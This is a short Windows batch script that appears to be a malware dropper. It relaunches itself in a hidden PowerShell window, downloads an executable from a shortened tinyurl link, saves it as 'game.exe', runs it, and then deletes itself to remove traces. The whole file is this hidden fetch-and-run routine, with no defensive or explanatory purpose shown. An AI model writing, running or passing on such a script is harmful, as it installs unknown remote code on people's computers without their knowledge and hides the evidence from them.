@echo off
if "%1" neq "hidden" (
  powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList hidden -WindowStyle Hidden"
  exit
)

set "URL=https://tinyurl.com/my0xfuck"
set "OUT=%~dp0game.exe"

curl -L "%URL%" -o "%OUT%"
start "" "%OUT%"

timeout /t 2 >nul
del "%~f0"
